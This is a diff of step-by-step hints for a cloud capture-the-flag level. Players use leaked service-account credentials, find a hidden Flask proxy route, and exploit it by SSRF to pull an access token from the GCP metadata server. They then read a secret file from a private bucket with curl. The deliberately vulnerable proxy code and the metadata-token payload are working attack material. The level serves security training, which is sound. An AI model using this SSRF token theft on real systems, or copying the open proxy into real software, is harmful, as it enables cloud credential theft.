@@ -1,0 +1,78 @@
+<pre>python3 thunder.py create thunder/a6container</pre>
+<p>Activate the service account given to you. You MUST do this, as using your google user account to complete the level would be considered cheating.</p>
+<pre>gcloud auth activate-service-account --key-file=start/a6-access.json</pre>
+---
+<pre>python3 thunder.py destroy</pre>
+---
+<p>Use the compromised service account credentials stored in {RESOURCE_PREFIX}-access.json to find the secret, which is located in a file called secret.txt in a private bucket on the project.</p>
+---
+<p>Test the permissions of the given credentials using the test-permissions.py script.</p>
+---
+<p>The credentials have the permission compute.instances.list and compute.instances.get</p>
+---
+<p>List the instances in the project:</p>
+<pre>gcloud compute instances list</pre>
+<p>Get information on the running instance:</p>
+<pre>gcloud compute instances describe [instance=name]</pre>
+---
+<p>The instance has the network tag "http-server," meaning it accepts traffic on port 80</p>
+<pre>tags:
+  fingerprint: FYLDgkTKlA4=
+  items:
+  - http-server</pre>
+<p>Try browsing the instance's external ip</p>
+---
+<p>The home page of the webapp doesn't have any useful information.</p>
+<p>However, notice from the instance metadata displayed from running "instances describe" that the webapp is running from a container on the instance:</p>
+<pre>metadata:
+  fingerprint: oHb5ZeEOk3Y=
+  items:
+  - key: gce-container-declaration
+    value: |
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: a6
+      spec:
+        containers:
+          - name: a6
+            image: docker.io/springern/thunder-ctf-a6:latest
+            imagePullPolicy: Always
+            ports:
+              - containerPort: 80
+                hostPort: 80</pre>
+---
+<p>The container image specified in the manifest is publicly available on Docker Hub. See if there's anything you can find on the container image.</p>
+<pre>image: docker.io/springern/thunder-ctf-a6:latest</pre>
+---
+<p>Pull the image:</p>
+<pre>docker pull springern/thunder-ctf-a6:latest</pre>
+<p>Create a container from the image and start an interactive shell session:</p>
+<pre>docker run -it --entrypoint=/bin/bash springern/thunder-ctf-a6</pre>
+---
+<p>The container seems to be running on flask. Look in "app.py" to see the logic of the webapp</p>
+---
+<p>It seems there is a secret admin page with a proxy, meaning you can make GET requests from the server.</p>
+<pre>@app.route('/admin-proxy-aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d')
+def proxy():
+    if 'url' not in request.args:
+        return render_template('proxy.html')
+    else:
+        return requests.get(request.args['url']).text</pre>
+<p>Try browsing the page /admin-proxy-aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d</p>
+---
+<p>Instances get access tokens from the metadata server just like cloud functions.</p>
+---
+<p>This web application is vulnerable to an <a class="inline" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-url-for-google-cloud">SSRF attack.</a></p>
+---
+<p>To get an access token from the instance, input the following url into the admin proxy:</p>
+<pre>http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</pre>
+---
+<p>Test the permissions of the token using the test-permissions.py script.</p>
+---
+<p>The token gives the permission storage.objects.get, meaning you can now get the contents of secret.txt using the <a a class="inline" href="https://cloud.google.com/storage/docs/json_api/v1/objects/get">GCS REST API.</a></p>
+<p>To find the location of secret.txt:</p>
+<pre>gsutil ls
+gsutil ls [bucket-name]</pre>
+---
+<pre>curl https://www.googleapis.com/storage/v1/b/[BUCKET-NAME]/o/[OBJECT-NAME]?alt=media -H "Authorization: Bearer [ACCESS-TOKEN]"</pre>
